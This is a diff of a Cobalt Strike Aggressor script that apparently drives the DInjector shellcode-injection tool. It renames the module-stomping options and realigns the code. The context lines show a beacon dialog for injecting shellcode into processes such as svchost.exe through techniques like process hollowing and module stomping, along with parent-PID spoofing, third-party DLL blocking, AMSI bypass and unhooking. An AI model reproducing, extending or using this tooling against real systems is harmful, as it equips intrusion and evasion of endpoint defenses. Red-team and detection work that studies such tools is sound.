@@ -55,16 +55,16 @@ sub dinject {
 
     # Construct the rest of the DInjector command
     $cmd .= " /password:$pass";
-    $cmd .= " /protect:"   . %options["protect"];
-    $cmd .= " /timeout:"   . %options["timeout"];
-    $cmd .= " /flipSleep:" . %options["flipSleep"];
-    $cmd .= " /image:"     . %options["image"];
-    $cmd .= " /pid:"       . %options["pid"];
-    $cmd .= " /ppid:"      . %options["ppid"];
-    $cmd .= " /dll:"       . %options["dll"];
-    $cmd .= " /stomp:"     . %options["stomp"];
-    $cmd .= " /export:"    . %options["export"];
-    $cmd .= " /sleep:"     . %options["sleep"];
+    $cmd .= " /protect:"     . %options["protect"];
+    $cmd .= " /timeout:"     . %options["timeout"];
+    $cmd .= " /flipSleep:"   . %options["flipSleep"];
+    $cmd .= " /image:"       . %options["image"];
+    $cmd .= " /pid:"         . %options["pid"];
+    $cmd .= " /ppid:"        . %options["ppid"];
+    $cmd .= " /dll:"         . %options["dll"];
+    $cmd .= " /stompDll:"    . %options["stompDll"];
+    $cmd .= " /stompExport:" . %options["stompExport"];
+    $cmd .= " /sleep:"       . %options["sleep"];
 
     if (%options["blockDlls"] eq "true") {
         $cmd .= " /blockDlls:True";
@@ -85,7 +85,7 @@ sub dinject {
          . %options["technique"] . " /sc:<BASE64>" . " /password:$pass" . " /protect:" . %options["protect"]
          . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /image:" . %options["image"]
          . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
-         . " /stomp:" . %options["stomp"] . " /export:" . %options["export"] . " /sleep:" . %options["sleep"]
+         . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
          . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . " /unhook:" . %options["unhook"]);
 }
 
@@ -114,22 +114,22 @@ popup beacon_bottom {
         %options["bid"] = $1[0];
 
         # Setup options values
-        %options["staged"]    = "false";
-        %options["exitfunc"]  = "process";
-        %options["technique"] = "CurrentThread";
-        %options["protect"]   = "RX";
-        %options["timeout"]   = "0";
-        %options["flipSleep"] = "0";
-        %options["image"]     = "C:\\Windows\\System32\\svchost.exe";
-        %options["pid"]       = "0";
-        %options["ppid"]      = "0";
-        %options["dll"]       = "msvcp_win.dll";
-        %options["stomp"]     = "xpsservices.dll";
-        %options["export"]    = "DllCanUnloadNow";
-        %options["blockDlls"] = "true";
-        %options["am51"]      = "true";
-        %options["sleep"]     = "0";
-        %options["unhook"]    = "false";
+        %options["staged"]      = "false";
+        %options["exitfunc"]    = "process";
+        %options["technique"]   = "CurrentThread";
+        %options["protect"]     = "RX";
+        %options["timeout"]     = "0";
+        %options["flipSleep"]   = "0";
+        %options["image"]       = "C:\\Windows\\System32\\svchost.exe";
+        %options["pid"]         = "0";
+        %options["ppid"]        = "0";
+        %options["dll"]         = "msvcp_win.dll";
+        %options["stompDll"]    = "xpsservices.dll";
+        %options["stompExport"] = "DllCanUnloadNow";
+        %options["blockDlls"]   = "true";
+        %options["am51"]        = "true";
+        %options["sleep"]       = "0";
+        %options["unhook"]      = "false";
 
         # Create a dialog
         $dialog = dialog("Dynamic Shellcode Injection", %options, &dinject);
@@ -157,16 +157,16 @@ popup beacon_bottom {
                                                                       "ProcessHollowing",
                                                                       "ModuleStomping"));
 
-        drow_text($dialog, "protect",   "Memory protection of the shellcode (0x20 / 0x40):");
-        drow_text($dialog, "timeout",   "Timeout for WaitForSingleObject in ms (0 is serve forever):");
-        drow_text($dialog, "flipSleep", "Time to sleep with PAGE_NOACCESS on shellcode in ms (0 disabled):");
-        drow_text($dialog, "image",     "Path to the image of a newly spawned process to inject into:");
-        drow_text($dialog, "pid",       "Existing process ID to inject into:");
-        drow_text($dialog, "ppid",      "Parent process ID to spoof the original value with:");
-        drow_text($dialog, "dll",       "Loaded DLL name to overwrite its .text section for storing the shellcode:");
-        drow_text($dialog, "stomp",     "Name of the DLL to stomp:");
-        drow_text($dialog, "export",    "Exported function name to overwrite:");
-        drow_text($dialog, "sleep",     "Sleep:", "number of seconds (approx.) to sleep before execution (10s-60s)");
+        drow_text($dialog, "protect",     "Memory protection of the shellcode (0x20 / 0x40):");
+        drow_text($dialog, "timeout",     "Timeout for WaitForSingleObject in ms (0 is serve forever):");
+        drow_text($dialog, "flipSleep",   "Time to sleep with PAGE_NOACCESS on shellcode in ms (0 disabled):");
+        drow_text($dialog, "image",       "Path to the image of a newly spawned process to inject into:");
+        drow_text($dialog, "pid",         "Existing process ID to inject into:");
+        drow_text($dialog, "ppid",        "Parent process ID to spoof the original value with:");
+        drow_text($dialog, "dll",         "Loaded DLL name to overwrite its .text section for storing the shellcode:");
+        drow_text($dialog, "stompDll",    "Name of the DLL to stomp:");
+        drow_text($dialog, "stompExport", "Exported function name to overwrite:");
+        drow_text($dialog, "sleep",       "Sleep:", "number of seconds (approx.) to sleep before execution (10s-60s)");
 
         drow_checkbox($dialog, "blockDlls", "DLLs:",   "Block 3rd-party DLLs");
         drow_checkbox($dialog, "am51",      "AMSI:",   "Bypass AMSI");
